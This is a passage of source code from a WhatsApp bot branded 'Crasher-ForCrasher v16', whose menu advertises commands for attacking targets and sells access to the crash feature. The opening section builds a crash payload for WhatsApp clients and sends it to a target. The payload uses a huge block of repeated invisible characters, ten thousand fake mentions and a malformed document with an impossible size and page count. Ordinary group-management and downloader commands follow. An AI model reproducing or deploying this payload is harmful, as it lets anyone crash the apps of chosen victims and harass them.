᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
								},
								nativeFlowMessage: {
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["628888888888@s.whatsapp.net", ...Array.from({
										length: 10000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\u0000",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				{
					participant: {
						jid: target
					}
				}
			);
		};
    // FUNC BUG LUBYZ
//==================================\\    
switch (command) {
case 'menu': {
await lubyz.sendMessage(from, {react: {text: "⌛", key: m.key}}); await sleep(10)
const text12 = `
스크립트는 Lubyzxmods에 의해 대상에게 버그를 보내도록 설계되었습니다. 충돌 자료, 시험, 무고한 사람들을 위한 스크립트를 오용하지 말고 가능한 한 잘 사용하십시오. 크래셔 팀을 위한 크래셔의 인사말 
> Contact Developer script LubyzXmods
t.me/lubyzofficial
wa.me/6282189474878

*𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭*
봇 이름 : 𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟔.𝟎.𝟎
봇 버전 : 𝟏𝟔.𝟎.𝟎
스크립트 디자이너 : 𝐋𝐮𝐛𝐲𝐳𝐳𝐗𝐦𝐨𝐝𝐬𝐬


다음은 대상을 공격하기 위해 봇을 실행하는 봇 명령입니다💥

손상 /LubyzxCrasher
손상 /Crasher-ForCrasher
손상 /Mode-Merusak
✧──────────────────────── ✧

다음은 봇 모드 도구를 실행하기 위한 명령입니다😃

덧셈 /Hd
덧셈 /Tagall
덧셈 /Hidetag
덧셈 /Remini

⨳───────────────────────⨳

다음은 대상을 공격하기 위해 봇을 실행하는 봇 명령입니다 , 이모티콘 버전 👾

.😎
.🥱
.🤨
.💥
❖────────────────────────❖

𝐁𝐞𝐫𝐢𝐤𝐮𝐭 𝐚𝐝𝐚𝐥𝐚𝐡 𝐂𝐨𝐦𝐦𝐚𝐧𝐝² 𝐛𝐨𝐭 , 𝐣𝐢𝐤𝐚 𝐚𝐝𝐚 𝐤𝐞𝐬𝐚𝐥𝐚𝐡𝐚𝐧 𝐦𝐨𝐡𝐨𝐧 𝐝𝐢 𝐦𝐚𝐚𝐟𝐤𝐚𝐧 , 𝐓𝐞𝐫𝐢𝐦𝐚𝐤𝐚𝐬𝐢𝐡 𝐓𝐞𝐥𝐚𝐡 𝐌𝐞𝐦𝐚𝐤𝐚𝐢 𝐒𝐜𝐫𝐢𝐩𝐭 𝐂𝐫𝐚𝐬𝐡𝐞𝐞-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐕𝟏𝟔

*Mau Script nya? Masuk sini*
https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U
https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U
`
 await lubyz.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/lcg8b5.jpg" },  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫",
                    newsletterJid: `120363395171754055@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟔.𝟎.𝟎`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://files.catbox.moe/lcg8b5.jpg',
                   sourceUrl: `https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U`
                }
            }
        },{ quoted: qloc }
     ),
       await lubyz.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/po4qd8.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: qloc }
     );
}
 break;
        
case 'aksesmenu': case 'add' :{
await lubyz.sendMessage(from, {react: {text: "⌛", key: m.key}}); await sleep(10)
const text12 = `

「 *INFO UPDATE SCRIPT* 」
https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U
`
await lubyz.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/lcg8b5.jpg" },  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫",
                    newsletterJid: `120363395171754055@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟔.𝟎.𝟎`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://files.catbox.moe/lcg8b5.jpg',
                   sourceUrl: `https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U`
                }
            }
        },{ quoted: qloc }
     )
}
break          
 //================================// 
 
 //================================//       
case 'lubyzmodebrutal': case 'bugmenu' :{
await lubyz.sendMessage(from, {react: {text: "🥵", key: m.key}}); await sleep(10)
const text12 = `
「 *INFO UPDATE SCRIPT* 」
https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U
`
await lubyz.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/lcg8b5.jpg" },  
            caption: text12,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟔.𝟎.𝟎",
                    newsletterJid: `120363395171754055@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `𝐂𝐫𝐚𝐬𝐡𝐞𝐫-𝐅𝐨𝐫𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐯𝟏𝟔.𝟎.𝟎`,
                   mediaType: 3,
                   renderLargerThumbnail: false,
                   thumbnailUrl: 'https://files.catbox.moe/lcg8b5.jpg',
                   sourceUrl: `https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U`
                }
            }
        },{ quoted: qloc }
     )
}

break
       //BASE ORI LUBYZ
//================================//
       //BASE ORI LUBYZ
 
case 'toolsmenu': case 'tools-menu': case 'menutols': case 'tolsmenu': case 'tolsmenuu': case 'toolsmenuu': 
await lubyz.sendMessage(from, {react: {text: "⌛", key: m.key}}); await sleep(10)
return reply(`

「 *Mau Jadi Premium? Masuk sinii* 」
https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U
`)
break 
 
case 'pantek': case 'pntk': case 'pantk': case 'ppk': case 'pepeq': case 'ppq': case 'pepek': case 'anjing': case 'anjg': case 'anj': case 'asu': case 'jancok': case 'jancuk': case 'jnck': case 'cok': case 'jancox': case 'cox': case 'memek': case 'memeq': case 'memeg': case 'mmk': case 'memk': case 'kontol': case 'kontl': case 'kntl': case 'ktl': case 'bacot': case 'bct':  case 'bcot': case 'goblok': case 'gblk': case 'goblk': case 'tolol': case 'tol': case 'bangsat': case 'bgst': case 'bego': case 'tai': case 'tae': case 'taek': case 'bajingan': case 'bjingan': case 'bjgn': case 'babi': case 'bbi': case 'kampret': case 'matamu': case 'ndasmu': case 'puki': case 'puqi': case 'pukimak': case 'bngke': case 'bangke': case 'bangkek': case 'cuk': case 'cik':
await lubyz.sendMessage(from, {react: {text: "🙏", key: m.key}}); await sleep(10)    
reply(`
*مَا شَيْءٌ أَثْقَلُ فِيْ مِيْزَانِ الْمُؤْمِنِ يَوْمَ الْقِيَامَةِ مِنْ خُلُقٍ حَسَنٍ وَإِنَّ اللهَ لَيُبْغِضُ الْفَاحِشَ الْبَذِيْءَ*

_“Sesungguhnya tidak ada sesuatu apapun yang paling berat ditimbangan kebaikan seorang mu’min pada hari kiamat seperti akhlaq yang mulia, dan sungguh-sungguh (benar-benar) Allāh benci dengan orang yang lisānnya kotor dan kasar.”_

\`jangan toxic lagi ya kak\` *@${pushname}* ☺`)
break        
        
case 'assalamualaikum': case 'asalamualaikum': case 'asalamuallaikum': case 'assalamuallaikum': case 'asalamuallaikum':
await lubyz.sendMessage(from, {react: {text: "👋", key: m.key}}); await sleep(10)      
return reply(`\`Waalaikumsalam kak\` *@${pushname}*`)

break        
        
//=============================//
       //BASE ORI LUBYZ
case 'hd': case 'remini': {
await lubyz.sendMessage(from, {react: {text: "🤖", key: m.key}}); await sleep(10)  
if (!Access && !isPremium) return lubyzReply(msg.premium)
if (!quoted) return reply(`Fotonya Mana Kak ?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
reply("Permintaan Sedang Di Proses....")
let media = await quoted.download()
const { remini } = require('./all/remini.js')
let proses = await remini(media, "enhance");
			lubyz.sendMessage(m.chat, { image: proses, caption: 'Done BY Lubyz Pemburu Tobrut😈'}, { quoted: m})
			await sleep(3000)
			} 
break
        

        
case 'done': case 'd': case 'don':{
await lubyz.sendMessage(from, {react: {text: "🤖", key: m.key}}); await sleep(10)
    
if (!isCmd) return;
if (!Access) return reply(msg.owner)
let s = text.split(',')
let barang = s[0]
let nominal = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal`)
if (!barang) return reply(`Example : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} Script,30.000`)
if (!nominal) return reply(`Example : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} janda,500.000`)
let textdone = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」
*📦 Barang :* ${barang}
*💸 Nominal :* Rp${nominal}
*📆 Tanggal :* ${tanggal(Date.now())}
*🕰️ Waktu :* ${wib} Wib
*✨ Status :* Done ✅`
lubyz.sendMessage(from, { text : textdone }, { quoted : m })

}

break       

        
case "proses":
case "masuk": 
case "sukk": 
case "suk":{
if (!isCmd) return;
if (!Access) return Reply(msg.owner)
if (!q) return m.reply(example("jasa Pasang Bot"))
let teks = `
*DANA MASUK*✅
_Pesanan Anda sedang Diproses_
📦 *Item*: ${text}
⏰ ${tanggal(Date.now())}

Mohon tunggu sebentar🙏
`
await lubyz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By Lubyz`, 
thumbnailUrl: "https://files.catbox.moe/lcg8b5.jpg", 
sourceUrl: `https://whatsapp.com/channel/0029Vaz0Pu84yltTX19IIK2U`
}}}, {quoted: null})
}
break
        
case 'tiktok': case "tt":{
if (!Access && !isPremium) return reply (msg.premium)  
if (!text) return reply(`Example : ${prefix + command} link`);
if (!text.includes('tiktok')) return reply(`Link Invalid!!`);
reply("Please Wait..");
    
 // Menggunakan fetch untuk akses API TikTok milikmu
    fetch(`https://api.tiklydown.eu.org/api/download/v5?url=${encodeURIComponent(text)}`)
        .then(response => response.json())
        .then(data => {
            if (data.status !== 200) return reply('Gagal mengambil data dari API');
            
            // Mengambil URL video dan audio
        const title = `*Successfully*`
            const videoUrl = data.result.play;
            const audioUrl = data.result.music;
            
            // Mengirim video dan audio
            lubyz.sendMessage(m.chat, { caption: title, video: { url: videoUrl }}, { quoted: m });
            lubyz.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' }, { quoted: qloc });
        })
        .catch(err => reply(err.toString()));
}
break;
        
case "spotify":
case "lagu":{
if (!Access && !isPremium) return reply(msg.premium)
 const axios = require("axios");
 if (!text) return reply(`Masukkan Judul Contoh\nContoh: ${prefix + command} Dj Tiktok`)

await reply("Mohon Tunggu Sebentar...");

try {
// URL API untuk pencarian lagu
const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
        const searchData = (await axios.get(searchApiUrl)).data;
        
        // Pilih hasil pertama dari data pencarian
        const data = searchData[0];
        if (!data) return reply("Lagu tidak ditemukan.");

        // Teks yang akan dikirimkan
        const tekswait = `_###_ *SPOTIFY SEARCH* _###_

- *Judul :* ${data.title}
- *Artis :* ${data.artist}
- *Url :* ${data.url}`;

        // Mengirim pesan informasi lagu
await lubyz.sendMessage(m.chat, { 
            text: `${tekswait}`, 
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: { 
                    showAdAttribution: true,
                    title:`${data.title}`,
                    body:"SPOTIFY SEARCH & DOWNLOAD",
                    thumbnailUrl: data.thumbnail,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            } 
        }, { quoted: qloc });

        // URL API untuk download lagu
        const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
        // Mendapatkan data dari API
        let response = await fetch(downloadApiUrl);
        
        // Memastikan respon adalah tipe audio
        if (response.headers.get("content-type") === "audio/mpeg") {
            // Mengirim audio melalui WhatsApp
            await lubyz.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: qloc });
        } else {
            m.reply("Gagal mendapatkan file audio.");
        }
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat mengambil file audio.");
    }
}
break
        
case 'g1pt4':
case '1gpt': 
case 'cg1pt':{
if (!Access && !isPremium) return reply(msg.premium)
await lubyz.sendMessage(from, {react: {text: "🤖", key: m.key}}); await sleep(10)
if (!text) return m.reply(`Hai, apa yang bisa saya bantu?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let kanjuthann = await openai(text, "nama mu adalah Lubyz, kamu adalah asisten kecerdasan buatan yang sering membantu orang lain jika ada yang ditanyakan")
m.reply(kanjuthann)
}
break
        // BASE ORI LUBYZ
//==================================//
        // CASE OWNER      
        
case "public": {
if (!Access) return lubyzReply(msg.owner)
lubyz.public = true
reply("Berhasil mengganti mode bot menjadi *Public*")
}
break

case "self": {
if (!Access) return lubyzReply(msg.owner)
lubyz.public = false
reply("Berhasil mengganti mode bot menjadi *Self*")
}
break

case "owner": {
lubyz.sendContact(m.chat, [owner], "Pengembang Bot WhatsApp", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: `https://files.catbox.moe/zzmm8z.jpg`, 
title: `© Copyright ${global.namabot}`, 
renderLargerThumbnail: true, 
sourceUrl: ``, 
mediaType: 1
}}})
}
break
        
case "addmurbug":{
if (!Access) return reply('Only Owner!')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxxx`)
let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await lubyz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
m.reply(`Sukses Menambahkan ${prrkek} Ke Daftar Murbug!`)
}
break
        
case "delmurbug":{
if (!Access) return reply('Only Owner!')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62xxx`)
let ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Sukses Menghapus ${ya} Dari Daftar Murbug!`)
}    
break
        
 case 'addowner': {
if (!Access) return reply(msg.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} `)
prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await lubyz.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
kontributor.push(prem1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(kontributor))
reply(`${prem1} Sudah menjadi kontributor!!!`)
lubyz.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://files.catbox.moe/zzmm8z.jpg`}, caption: `Kamu sekarang adalah owner / kontributor bot`},{quoted: qloc})
 }
break;              

  case 'addgc':
if (!Access) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return m.reply("Khusus Owner")
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} Success Active To Crate Panel`)
break          
 
case "kik": case "kick": case "sulap": {
if (!isGroup) return lubyzReply(msg.group)
if (!isBotAdmin) return lubyzReply(msg.adminbot)
if (!isAdmin && !Access) return lubyzReply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await lubyz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => lubyz.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => reply(err.toString()))
} else return reply(example('62xxx/@tag'))}
break
        
case "hidetag": case "ht": case "h": {
if (!Access) return lubyzReply(msg.owner)
if (!isAdmin && !Access) return lubyzReply(msg.admin)
if (!m.quoted && !text) return reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
lubyz.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
        
case "tagall": case "tag": {
if (!Access) return lubyzReply(msg.owner)
if (!isAdmin && !Access) return lubyzReply(msg.admin)
if (!text) return reply(example("Pesannya"))
var member = await groupMetadata.participants.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
lubyz.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
          //BASE ORI LUBYZ
//===================================\\
        // AWAL CASE GRUP
case 'tutup': case 'close':{
if (!isGroup) return reply(`Khusus Group`)
if (!Access) return lubyzReply(msg.owner)
if (!isAdmin) return reply('Khusus Admin')
if (!isBotAdmin) return reply(`Bot harus Admin`)

var nomor = m.participant
lubyz.groupSettingUpdate(m.chat, 'announcement')
reply(`Grup ditutup Sementara Oleh Admin🙏\nGrup Akan Dibuka lagi dalam. beberapa saat`)
}
break  

case 'buka': case 'open':{
if (!isGroup) return reply(`Khusus Grup`)
if (!Access) return lubyzReply(msg.owner)
if (!isAdmin) return reply('Khusus Admin')
if (!isBotAdmin) return reply(`Bot harus Admin`)
var nomor = m.participant
lubyz.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Grup Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}
break
 
case  'intra1nsnsb': {
if (!isGroup) return reply(msg.group)
let teks = '*Member baru wajib INTRO  :)*\nNama lengkap:\nNama panggilan:\nHobi:\nUmur:\nGender:\nKelas:\nTinggi badan:\nBeratbadan :\nAgama:\nGolongan darah:\nStatus:\nNama pacar:\nJumlah mantan:\nNama mantan:\nNama bapak :\nNama ibu : \nNama kakak:\nKakak online:\nKakak kandung\tiri:\nJumlah kakak:\nNama adek:\nAdek online:\nAdek kandung\tiri:\nJumlah adek:\nNama kakek:\nKakek dari ayah :\nKakek dari ibu :\nNama nenek:\nNenek dari ayah :\nNenek dari ibu :\nNama bibi:\nBibi dari ayah :\nBibi dari ibu :\nNama paman:\nBibi dari ayah :\nBibi dari ibu :\nKTP:\nSIM:\nSTNK:\nBPKB:\nKK:\nAlamat rumah:\nRT:\nRW:\nKELURAHAN:\nKECAMATAN:\nKABUPATEN:\nKOTA:\nPROVINSI:\nPLANET:\nGALAXY:\nUNIVERSE:\nLANGIT:\nDARATAN:\nLAUTAN:\nKEPULAUAN:\nSAMUDRA:\nUKURAN SEPATU:\nUKURAN BAJU:\nUKURAN CELANA:\nLEBAR PINGGANG:\nPANJANG TANGAN:\nPANJANG KAKI:\nMAKANAN FAVORIT:\nMINUMAN FAVORIT:\nFILM FAVORIT:\nSINETRON FAVORIT:\nGAME FAVORIT:\nANIME FAVORIT:\nMANGA FAVORIT:\nMANHUA FAVORIT:\nMANHWA FAVORIT:\nCHANNEL YOUTUBE:\nINSTAGRAM:\nTWITTEER:\nFACEBOOK:\nMUSIC FAVORIT:\nSIFAT:\nSIKAP:\nZODIAK:\nTANGGAL LAHIR:\nMERK HP:\nMERK MOTOR:\nMERK MOBIL:\nTINGKAT RUMAH:\nALAMAT SEKOLAH:\nUkuran daleman:\nUkuran atasan :\nDiameter kepala :\nStatistik tubuh:\nDiameter perut :\nDiameter lengan :\nDiameter paha :\nDiameter lutut :\nDiameter betis:\nPanjang tangan :\nPanjang kaki :\nPanjang kepala :\nLebar hidung :\nCita cita :\nHobi :\nJenis hewanpeliharaan :\nNama hewan:\nDiameter rumah:\nWaifu:\nHusbu:\nLoli kesukaan :\nShota kesukaan :\nPunya brp teman :\nTeman online :\nTeman offline :\nTeman main game:\nTeman sekolah:\nTemen rumah:'
reply(teks)
}
break
        
  //====================================\\    
//===================================\\
      // ISLAMIC MENU      
        
case 'kisahn1abi': {
if (!text) return reply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return reply("*Not Found*\n*📮 ᴛɪᴘs :* Nama Nabi tidak sesuai/coba jangan gunakan huruf capital")
let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*
${kisah.description}`
reply(`${hasil}`)
}
break        
 //=================================\\  // Asmaul Husna    
 case 'asmaulhus1na': {
const contoh = `*Asmaul Husna*`
